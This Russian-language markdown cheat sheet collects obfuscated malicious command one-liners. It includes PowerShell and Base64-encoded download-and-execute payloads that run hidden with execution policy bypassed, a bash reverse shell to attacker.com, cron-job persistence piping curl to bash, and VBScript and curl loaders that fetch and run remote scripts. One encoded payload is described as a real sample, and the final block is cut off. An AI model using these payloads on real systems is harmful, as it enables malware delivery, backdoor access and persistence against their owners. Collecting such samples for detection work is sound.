> [!WARNING]
> Команды не рабочие все ссылки заменены, но это не отменяет перепроверку и аккуратность использования

## Простая обфускация с использованием строк
```cmd
$e=([char]0x68+[char]0x65+[char]0x6C+[char]0x6C+[char]0x6F);iex $e
```
## Использование Base64 для кодирования
```powershell
powershell.exe -Command "$s = [Sy\u0073tem.Text.En\u0063oding]::ASCII.GetString([Sy\u0073tem.Convert]::FromBase64String('aHR0cHM6Ly9tYWwwd2FyZS5ydS9wYXlsb2FkX3NvbWU=')); iwr $s -UseBasicParsing | iex"
```
## Использование Base64 для кодирования с праметрами запуска PS
```powershell
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -W Hidden -Command "$s = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('aHR0cDovL2FiYzkxMXRlc3RLSVJBbGluay5jb20vZC9iYWNrZG9vcjEyMy5leGU=')); iwr $s -OutFile backdoor.exe; Start-Process .\backdoor.exe"
```
## Использование строковых манипуляций для скрытия команды
```powershell
$cmd = 'powershell.exe -nop -w hidden -e ' + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('Invoke-WebRequest "http://evil-some.com/malicious123.exe" -OutFile "malicious.exe"; Start-Process "malicious.exe"'))) iex ($cmd)
```
## Использование альтернативных имен для стандартных команд
```powershell
$cmd = New-Object System.Net.WebClient; $cmd.DownloadFile("http://evil-some.com/payload123.exe", "C:\path\to\payload.exe")
```
## Обратный Shell (доступ через бэкдор)
```bash
bash -i >& /dev/tcp/attacker.com/4784 0>&1
```
## Скрытие вредоносных заданий Cron
```bash
echo "*/5 * * * * curl bad.site/payload.sh | bash" >> /var/spool/cron/root
```
## Полезная нагрузка с загрузкой и выполнением через VBScript
```cmd
cmd /c echo Set h=CreateObject("WinHttp.WinHttpRequest.5.1"):h.Open "GET","http://example.com:5506/ny.vbs",0:h.Send:Execute h.ResponseText > "%temp%\ny.vbs" && "%temp%\ny.vbs"
```
## Вредоносная полезная нагрузка на VBScript с загрузкой и выполнением из веба
```cmd
cmd /c echo Set h=CreateObject("WinHttp.WinHttpRequest.5.1"):h.Open "GET","http://example.com:5506/wk.vbs",0:h.Send:Execute h.ResponseText > "%temp%wk.vbs" && "%temp%wk.vbs"
```
## Обфусцированная PowerShell-полезная нагрузка с загрузкой и выполнением

> [!CAUTION]
> Выполняйте команду только в изолированной среде, она является реальным примером

```powershell
powershell -wind mi -Enc JwBhACcALAAnAHoAJwB8ACUAewAuACcAaQBlAHgAJwAoACgAKAAiAHcAaQB3AHIAbQAgADcANgAzADYAMwA4ADEAOQAxAC8AbABvAG0ALwAkAF8ALgBnAHcAaQBmAHwAdwBpAHcAZQB3AHgAIgApAC4AcgBlAHAAbABhAGMAZQAoACcAdwAnACwAJwAnACkAKQApAH0A
```
## Загрузчик VBScript в Windows через curl
```cmd
cmd /c "curl -s http:/example.com:5506/dd.vbs -o %temp%dd.vbs >nul && start /b wscript.exe //B //E:VBScript %temp%dd.vbs && exit"
```
```cmd
cmd /c "curl -s http:/example.com:5506/dd.vbs -o %temp%dd.vbs >nul && start /b wscript.exe //B //E:VBScript %temp%dd.
```



